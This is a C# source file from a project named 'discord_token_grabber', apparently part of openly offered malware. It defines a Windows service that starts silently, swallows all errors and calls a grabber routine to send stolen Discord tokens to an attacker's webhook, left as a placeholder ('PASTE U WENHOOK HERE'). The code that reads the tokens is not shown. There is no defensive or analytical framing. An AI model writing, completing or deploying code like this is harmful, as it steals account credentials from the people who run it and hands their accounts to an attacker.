using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace discord_token_grabber
{
    public partial class Webhook : ServiceBase
    {
        public Webhook()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try { this.StartWork(); } catch (Exception ex) { }
        }

        public void StartWork()
        {
            string WEBHOOK_URL = "PASTE U WENHOOK HERE";

            var discord_Grabber = new grabber();
            List<string> webhooks = new List<string> { WEBHOOK_URL };
            discord_Grabber.MultipleThreadSendToken(webhooks);
        }
    }
}
